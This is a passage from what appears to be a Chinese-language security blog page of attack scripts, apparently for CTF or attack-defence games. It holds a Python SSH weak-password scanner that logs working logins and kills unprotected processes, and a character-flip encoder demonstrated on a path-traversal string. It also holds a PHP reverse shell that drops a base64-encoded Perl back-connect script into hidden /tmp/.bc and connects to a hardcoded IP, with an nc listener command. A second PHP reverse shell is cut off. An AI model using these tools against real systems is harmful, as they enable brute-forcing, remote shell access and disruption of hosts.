class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#2018-01-17</span></span><br><span class="line"><span class="comment">#by-duwentao</span></span><br><span class="line"><span class="comment">#version:python 2.7.9</span></span><br><span class="line"><span class="comment">#python2.6.6也可以使用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line">pid_list=[]</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置最大进程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">max_pid</span><span class="params">()</span>:</span></span><br><span class="line">	f = open(<span class="string">"/proc/sys/kernel/pid_max"</span>,<span class="string">"r"</span>)</span><br><span class="line">	pid = int(f.read().strip(<span class="string">"\n"</span>))</span><br><span class="line">	f.close()</span><br><span class="line">	<span class="keyword">if</span> pid != <span class="number">1024</span>:</span><br><span class="line">		<span class="keyword">print</span> pid</span><br><span class="line">		<span class="comment">#设置最大进程数1024</span></span><br><span class="line">		os.system(<span class="string">"echo \"1024\" &gt;&gt;  /proc/sys/kernel/pid_max"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"max_pid : 1024"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取需要保护的pid进程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pid</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="comment">#判断要保护的进程是否存在，不存在则获取</span></span><br><span class="line">	<span class="keyword">if</span> os.path.exists(<span class="string">"pid.txt"</span>):</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		os.system(<span class="string">"ps aux |awk \'&#123;print $2&#125;\' |sed \'s/PID/0/g\' &gt;&gt; pid.txt"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#把要保护的进行加到列表里</span></span><br><span class="line">	f = open(<span class="string">"pid.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line">	<span class="keyword">for</span> pid <span class="keyword">in</span> f.readlines():</span><br><span class="line">		pid = int(pid.strip(<span class="string">"\n"</span>))</span><br><span class="line">		pid_list.append(pid)</span><br><span class="line">				</span><br><span class="line">	f.close()</span><br><span class="line">	<span class="keyword">return</span> pid_list</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kill_pid</span><span class="params">(pid_list)</span>:</span></span><br><span class="line">	</span><br><span class="line">	self_pid = os.getpid() <span class="comment">#获取自己程序的pid</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1025</span>):</span><br><span class="line">			<span class="keyword">if</span> i <span class="keyword">in</span> pid_list:</span><br><span class="line">				<span class="keyword">pass</span></span><br><span class="line">			<span class="keyword">elif</span> (i == self_pid):</span><br><span class="line">				<span class="keyword">pass</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">try</span>:</span><br><span class="line">					a = os.kill(i, signal.SIGKILL)</span><br><span class="line">					<span class="keyword">print</span> <span class="string">'已杀死pid为%s的进程,　返回值是:%s'</span> % (i, a)</span><br><span class="line"></span><br><span class="line">				<span class="keyword">except</span>:</span><br><span class="line">					<span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ip</span><span class="params">()</span>:</span></span><br><span class="line">	</span><br><span class="line">	ip5 = int(raw_input(<span class="string">"请输入要循环ip的第几位（3或者4）:"</span>).strip(<span class="string">"\n"</span>))</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ip5 == <span class="number">3</span> :</span><br><span class="line">		ip1 = int(raw_input(<span class="string">"请输入ip第一位:"</span>).strip(<span class="string">"\n"</span>))</span><br><span class="line">		ip2 = int(raw_input(<span class="string">"请输入ip第二位:"</span>).strip(<span class="string">"\n"</span>))</span><br><span class="line">		ip3 = int(raw_input(<span class="string">"请输入ip第三位:"</span>).strip(<span class="string">"\n"</span>))</span><br><span class="line">		ip4 = int(raw_input(<span class="string">"请输入ip第四位:"</span>).strip(<span class="string">"\n"</span>))</span><br><span class="line">		username = raw_input(<span class="string">"请输入用户名:"</span>).strip(<span class="string">"\n"</span>)</span><br><span class="line">		passwd = raw_input(<span class="string">"请输入默认密码:"</span>).strip(<span class="string">"\n"</span>)</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> ip3 <span class="keyword">in</span> range(<span class="number">105</span>,<span class="number">107</span>):</span><br><span class="line"></span><br><span class="line">			ip = str(ip1) + <span class="string">"."</span> + str(ip2) + <span class="string">"."</span>  + str(ip3) + <span class="string">"."</span> + str(ip4)</span><br><span class="line">			ssh_connect(ip,username,passwd) <span class="comment">#调用连接函数</span></span><br><span class="line">	<span class="keyword">elif</span> ip5 == <span class="number">4</span>:</span><br><span class="line">		ip1 = int(raw_input(<span class="string">"请输入ip第一位:"</span>).strip(<span class="string">"\n"</span>))</span><br><span class="line">		ip2 = int(raw_input(<span class="string">"请输入ip第二位:"</span>).strip(<span class="string">"\n"</span>))</span><br><span class="line">		ip3 = int(raw_input(<span class="string">"请输入ip第三位:"</span>).strip(<span class="string">"\n"</span>))</span><br><span class="line">		<span class="comment">#ip4 = int(raw_input("请输入ip第四位:").strip("\n"))</span></span><br><span class="line">		username = raw_input(<span class="string">"请输入用户名:"</span>).strip(<span class="string">"\n"</span>)</span><br><span class="line">		passwd = raw_input(<span class="string">"请输入默认密码:"</span>).strip(<span class="string">"\n"</span>)</span><br><span class="line">		<span class="keyword">for</span> ip4 <span class="keyword">in</span> range(<span class="number">105</span>,<span class="number">107</span>):</span><br><span class="line">			ip = str(ip1) + <span class="string">"."</span> + str(ip2) + <span class="string">"."</span>  + str(ip3) + <span class="string">"."</span> + str(ip4)</span><br><span class="line">			ssh_connect(ip,username,passwd)		</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">print</span> (<span class="string">"输入有误，正在退出"</span>)</span><br><span class="line">		exit()</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh_connect</span><span class="params">(ip,username,passwd)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#python2.6.6自带的模块</span></span><br><span class="line">        <span class="keyword">import</span> paramiko</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"请使用python2.6.6运行或者安装paramiko模块"</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		ssh = paramiko.SSHClient()</span><br><span class="line">        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">        ssh.connect(ip,username=username,password=passwd,timeout= <span class="number">1</span> )</span><br><span class="line">        <span class="comment">#os.system(" echo centos | passwd --stdin root")</span></span><br><span class="line">        <span class="comment"># 修改root密码为centos</span></span><br><span class="line">        f=open(<span class="string">'ssh.txt'</span>,<span class="string">'a'</span>)</span><br><span class="line">        f.write(<span class="string">"ip:%s,username:%s,password:%s\n"</span> %(ip,username,passwd))</span><br><span class="line">        f.close()</span><br><span class="line">        ssh.close()</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">       ·<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:		</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"\033[32m -------请选择------\033[0m"</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"\033[32m 1.获取和修改最大pid\033[0m"</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"\033[32m 2.获取受保护的pid值\033[0m"</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"\033[32m 3.获取ssh弱口令密码\033[0m"</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"\033[32m 4.杀死不受保护的pid\033[0m"</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"\033[32m 5.退出本程序的运行\033[0m"</span></span><br><span class="line">		<span class="keyword">try</span>:	</span><br><span class="line">			c =int(raw_input(<span class="string">"请输入你要选择的序号："</span>))</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"\033[31m your input is wrong \033[0m"</span></span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">if</span> c == <span class="number">1</span>:</span><br><span class="line">			max_pid()</span><br><span class="line">		<span class="keyword">elif</span> (c == <span class="number">2</span>):</span><br><span class="line">			get_pid()</span><br><span class="line">		<span class="keyword">elif</span> ( c == <span class="number">3</span> ):</span><br><span class="line">			get_ip() </span><br><span class="line">		<span class="keyword">elif</span> (c == <span class="number">4</span>):</span><br><span class="line">			kill_pid(pid_list)</span><br><span class="line">		<span class="keyword">elif</span> ( c == <span class="number">5</span> ):</span><br><span class="line">			exit()</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"\033[31m your input is wrong \033[0m"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	print(<span class="string">"用的时候最好把汉语换成英语，避免出现乱码"</span>)</span><br><span class="line">	menu()</span><br></pre></td></tr></table></figure>

<p><a href="http://player.youku.com/embed/XMzgwMTMyMTAzNg==" target="_blank" rel="noopener">演示视频</a></p>
<h2 id="常见编码反转脚本"><a href="#常见编码反转脚本" class="headerlink" title="常见编码反转脚本"></a>常见编码反转脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># writer: Menzel3</span></span><br><span class="line"><span class="comment"># data:   2018-8-29</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">flipTable = &#123;</span><br><span class="line">    <span class="string">'\u0021'</span>: <span class="string">'\u00A1'</span>,</span><br><span class="line">    <span class="string">'\u0022'</span>: <span class="string">'\u201E'</span>,</span><br><span class="line">    <span class="string">'\u0026'</span>: <span class="string">'\u214B'</span>,</span><br><span class="line">    <span class="string">'\u0027'</span>: <span class="string">'\u002C'</span>,</span><br><span class="line">    <span class="string">'\u0028'</span>: <span class="string">'\u0029'</span>,</span><br><span class="line">    <span class="string">'\u002E'</span>: <span class="string">'\u02D9'</span>,</span><br><span class="line">    <span class="string">'\u0033'</span>: <span class="string">'\u0190'</span>,</span><br><span class="line">    <span class="string">'\u0034'</span>: <span class="string">'\u152D'</span>,</span><br><span class="line">    <span class="string">'\u0036'</span>: <span class="string">'\u0039'</span>,</span><br><span class="line">    <span class="string">'\u0037'</span>: <span class="string">'\u2C62'</span>,</span><br><span class="line">    <span class="string">'\u003B'</span>: <span class="string">'\u061B'</span>,</span><br><span class="line">    <span class="string">'\u003C'</span>: <span class="string">'\u003E'</span>,</span><br><span class="line">    <span class="string">'\u003F'</span>: <span class="string">'\u00BF'</span>,</span><br><span class="line">    <span class="string">'\u0041'</span>: <span class="string">'\u2200'</span>,</span><br><span class="line">    <span class="string">'\u0042'</span>: <span class="string">'\u10412'</span>,</span><br><span class="line">    <span class="string">'\u0043'</span>: <span class="string">'\u2183'</span>,</span><br><span class="line">    <span class="string">'\u0044'</span>: <span class="string">'\u25D6'</span>,</span><br><span class="line">    <span class="string">'\u0045'</span>: <span class="string">'\u018E'</span>,</span><br><span class="line">    <span class="string">'\u0046'</span>: <span class="string">'\u2132'</span>,</span><br><span class="line">    <span class="string">'\u0047'</span>: <span class="string">'\u2141'</span>,</span><br><span class="line">    <span class="string">'\u004A'</span>: <span class="string">'\u017F'</span>,</span><br><span class="line">    <span class="string">'\u004B'</span>: <span class="string">'\u22CA'</span>,</span><br><span class="line">    <span class="string">'\u004C'</span>: <span class="string">'\u2142'</span>,</span><br><span class="line">    <span class="string">'\u004D'</span>: <span class="string">'\u0057'</span>,</span><br><span class="line">    <span class="string">'\u004E'</span>: <span class="string">'\u1D0E'</span>,</span><br><span class="line">    <span class="string">'\u0050'</span>: <span class="string">'\u0500'</span>,</span><br><span class="line">    <span class="string">'\u0051'</span>: <span class="string">'\u038C'</span>,</span><br><span class="line">    <span class="string">'\u0052'</span>: <span class="string">'\u1D1A'</span>,</span><br><span class="line">    <span class="string">'\u0054'</span>: <span class="string">'\u22A5'</span>,</span><br><span class="line">    <span class="string">'\u0055'</span>: <span class="string">'\u2229'</span>,</span><br><span class="line">    <span class="string">'\u0056'</span>: <span class="string">'\u1D27'</span>,</span><br><span class="line">    <span class="string">'\u0059'</span>: <span class="string">'\u2144'</span>,</span><br><span class="line">    <span class="string">'\u005B'</span>: <span class="string">'\u005D'</span>,</span><br><span class="line">    <span class="string">'\u005F'</span>: <span class="string">'\u203E'</span>,</span><br><span class="line">    <span class="string">'\u0061'</span>: <span class="string">'\u0250'</span>,</span><br><span class="line">    <span class="string">'\u0062'</span>: <span class="string">'\u0071'</span>,</span><br><span class="line">    <span class="string">'\u0063'</span>: <span class="string">'\u0254'</span>,</span><br><span class="line">    <span class="string">'\u0064'</span>: <span class="string">'\u0070'</span>,</span><br><span class="line">    <span class="string">'\u0065'</span>: <span class="string">'\u01DD'</span>,</span><br><span class="line">    <span class="string">'\u0066'</span>: <span class="string">'\u025F'</span>,</span><br><span class="line">    <span class="string">'\u0067'</span>: <span class="string">'\u0183'</span>,</span><br><span class="line">    <span class="string">'\u0068'</span>: <span class="string">'\u0265'</span>,</span><br><span class="line">    <span class="string">'\u0069'</span>: <span class="string">'\u0131'</span>,</span><br><span class="line">    <span class="string">'\u006A'</span>: <span class="string">'\u027E'</span>,</span><br><span class="line">    <span class="string">'\u006B'</span>: <span class="string">'\u029E'</span>,</span><br><span class="line">    <span class="string">'\u006C'</span>: <span class="string">'\u0283'</span>,</span><br><span class="line">    <span class="string">'\u006D'</span>: <span class="string">'\u026F'</span>,</span><br><span class="line">    <span class="string">'\u006E'</span>: <span class="string">'\u0075'</span>,</span><br><span class="line">    <span class="string">'\u0072'</span>: <span class="string">'\u0279'</span>,</span><br><span class="line">    <span class="string">'\u0074'</span>: <span class="string">'\u0287'</span>,</span><br><span class="line">    <span class="string">'\u0076'</span>: <span class="string">'\u028C'</span>,</span><br><span class="line">    <span class="string">'\u0077'</span>: <span class="string">'\u028D'</span>,</span><br><span class="line">    <span class="string">'\u0079'</span>: <span class="string">'\u028E'</span>,</span><br><span class="line">    <span class="string">'\u007B'</span>: <span class="string">'\u007D'</span>,</span><br><span class="line">    <span class="string">'\u203F'</span>: <span class="string">'\u2040'</span>,</span><br><span class="line">    <span class="string">'\u2045'</span>: <span class="string">'\u2046'</span>,</span><br><span class="line">    <span class="string">'\u2234'</span>: <span class="string">'\u2235'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flipString</span><span class="params">(aString)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(aString)):</span><br><span class="line">        <span class="keyword">if</span> aString[i:i+<span class="number">1</span>] <span class="keyword">in</span> flipTable: result += flipTable[aString[i]]</span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            result += aString[i:i+<span class="number">1</span>]</span><br><span class="line">            print(<span class="string">'[-]unknew'</span> + aString[i:i+<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> result[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unflipString</span><span class="params">(aString)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(aString)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> flipTable.items():</span><br><span class="line">            <span class="keyword">if</span> aString[i:i+<span class="number">1</span>] == j[<span class="number">1</span>]: </span><br><span class="line">                result += j[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            result += aString[i:i+<span class="number">1</span>]</span><br><span class="line">            print(<span class="string">'[-]unknew'</span> + aString[i:i+<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> result[::<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    method = sys.argv[<span class="number">1</span>]</span><br><span class="line">    code = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    print(<span class="string">'-h      help\n-d      decode the code to decode.txt\ndefault encode the code to encode.txt\n'</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">filename = <span class="string">'encode.txt'</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'h'</span> <span class="keyword">in</span> method:</span><br><span class="line">    print(<span class="string">'-h      help\n-d      decode the code to decode.txt\ndefault encode the code to encode.txt\n'</span>, flush=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'f'</span> <span class="keyword">in</span> method:</span><br><span class="line">    <span class="keyword">with</span> open(file=code, mode=<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        code = f.read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        print(code, <span class="string">' -- '</span>, type(code), <span class="string">' -- '</span>, len(code))</span><br><span class="line"><span class="keyword">if</span> <span class="string">'d'</span> <span class="keyword">in</span> method:</span><br><span class="line">    filename = <span class="string">'decode.txt'</span></span><br><span class="line">    result = unflipString(code)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    result = flipString(code)</span><br><span class="line"><span class="keyword">with</span> open(file=filename, mode=<span class="string">'w'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(result)</span><br></pre></td></tr></table></figure>

<p>如何用：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">C:\Users\<span class="number">95112</span>\Desktop\常见字符翻转工具\常见字符翻转&gt;python3 C:\Users\<span class="number">95112</span>\Desktop\常见字符翻转工具\常见字符翻转\flipString.py -e ../home/bsidestlv/flag.txt</span><br><span class="line">[-]unknew/</span><br><span class="line">[-]unknewo</span><br><span class="line">[-]unknew/</span><br><span class="line">[-]unknews</span><br><span class="line">[-]unknews</span><br><span class="line">[-]unknew/</span><br><span class="line">[-]unknewx</span><br><span class="line"></span><br><span class="line">执行完毕后输出：ʇxʇ˙ƃɐʃɟ/ʌʃʇsǝpısq/ǝɯoɥ/˙˙</span><br><span class="line">即把../home/bsidestlv/flag.txt反转成 ʇxʇ˙ƃɐʃɟ/ʌʃʇsǝpısq/ǝɯoɥ/˙˙</span><br></pre></td></tr></table></figure>

<h2 id="php反弹shell"><a href="#php反弹shell" class="headerlink" title="php反弹shell"></a>php反弹shell</h2><p>nc监听</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p port</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> <span class="comment">#在服务器没有gcc和perl,python的时候可以用到，调用php的函数反弹shell</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span><span class="params">($pr)</span> </span>&#123; </span><br><span class="line">$path = execute(<span class="string">"which $pr"</span>); </span><br><span class="line"><span class="keyword">return</span> ($path ? $path : $pr); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cfe)</span> </span>&#123; </span><br><span class="line">$res = <span class="string">''</span>; </span><br><span class="line"><span class="keyword">if</span> ($cfe) &#123; </span><br><span class="line"><span class="keyword">if</span>(function_exists(<span class="string">'exec'</span>)) &#123; </span><br><span class="line">@exec($cfe,$res); </span><br><span class="line">$res = join(<span class="string">"\n"</span>,$res); </span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'shell_exec'</span>)) &#123; </span><br><span class="line">$res = @shell_exec($cfe); </span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'system'</span>)) &#123; </span><br><span class="line">@ob_start(); </span><br><span class="line">@system($cfe); </span><br><span class="line">$res = @ob_get_contents(); </span><br><span class="line">@ob_end_clean(); </span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'passthru'</span>)) &#123; </span><br><span class="line">@ob_start(); </span><br><span class="line">@passthru($cfe); </span><br><span class="line">$res = @ob_get_contents(); </span><br><span class="line">@ob_end_clean(); </span><br><span class="line">&#125; <span class="keyword">elseif</span>(@is_resource($f = @popen($cfe,<span class="string">"r"</span>))) &#123; </span><br><span class="line">$res = <span class="string">''</span>; </span><br><span class="line"><span class="keyword">while</span>(!@feof($f)) &#123; </span><br><span class="line">$res .= @fread($f,<span class="number">1024</span>); </span><br><span class="line">&#125; </span><br><span class="line">@pclose($f); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> $res; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span><span class="params">($fname,$text)</span></span>&#123; </span><br><span class="line"><span class="keyword">if</span>($fp=@fopen($fname,<span class="string">'w'</span>)) &#123; </span><br><span class="line">@fputs($fp,@base64_decode($text)); </span><br><span class="line">@fclose($fp); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$yourip = <span class="string">"172.24.10.96"</span>; </span><br><span class="line">$yourport = <span class="string">'9999'</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$usedb = <span class="keyword">array</span>(<span class="string">'perl'</span>=&gt;<span class="string">'perl'</span>,<span class="string">'c'</span>=&gt;<span class="string">'c'</span>); </span><br><span class="line">$back_connect=<span class="string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span>. </span><br><span class="line"><span class="string">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span>. </span><br><span class="line"><span class="string">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span>. </span><br><span class="line"><span class="string">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span>. </span><br><span class="line"><span class="string">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span>. </span><br><span class="line"><span class="string">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span>. </span><br><span class="line"><span class="string">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>; </span><br><span class="line">cf(<span class="string">'/tmp/.bc'</span>,$back_connect); </span><br><span class="line">$res = execute(which(<span class="string">'perl'</span>).<span class="string">" /tmp/.bc $yourip $yourport &amp;"</span>); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="PHP反弹shell"><a href="#PHP反弹shell" class="headerlink" title="PHP反弹shell"></a>PHP反弹shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span 